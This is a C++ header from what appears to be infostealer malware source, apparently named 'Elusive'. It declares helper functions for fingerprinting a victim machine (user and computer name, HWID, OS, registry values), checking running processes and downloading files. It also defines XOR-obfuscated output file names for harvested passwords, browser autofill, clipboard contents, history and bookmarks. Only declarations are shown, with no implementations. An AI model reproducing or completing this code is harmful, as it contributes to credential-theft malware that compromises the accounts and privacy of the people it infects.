#include "../../win.h"
#include "../xor/xor.h"

enum DIR {
	DIR_FOUNDED = 3,
	FILE_FOUNDED = 2,
	FAIL_FOUNDED = 0
};

struct tools {
public:
	std::string random_string(std::string::size_type length, std::string chars);
	std::string get_program_dir();
	std::string get_user_name();
	std::string get_computer_name();
	std::string get_system_disk();
	std::string get_os_name();
	std::string get_hwid();
	std::string get_regedit_info(HKEY key, LPCSTR sub_key, LPCSTR value_name);
	std::string get_battery_info();
	std::string decrypt_c32(std::string c);
	std::string get_date_time_string();
	std::string read_file(std::string file_path, int flags = std::ios::in);

	DIR check_directory(const char* path);
	int download_file(std::string url, std::string file_path);
	int is_process_running(std::string name);
public:
	std::string instruction_file = std::string(XOR_STRING("ElusiveReadme.txt"));
	std::string clipboard_file = std::string(XOR_STRING("Clipboard.txt"));
	std::string processlist_file = std::string(XOR_STRING("Process List.txt"));
	std::string passwords_file = std::string(XOR_STRING("Passwords.txt"));
	std::string autofill_file = std::string(XOR_STRING("Autofill.txt"));
	std::string downloads_file = std::string(XOR_STRING("Downloads.txt"));
	std::string history_file = std::string(XOR_STRING("History.txt"));
	std::string bookmarks_file = std::string(XOR_STRING("Bookmarks.txt"));
};

extern tools g_tools;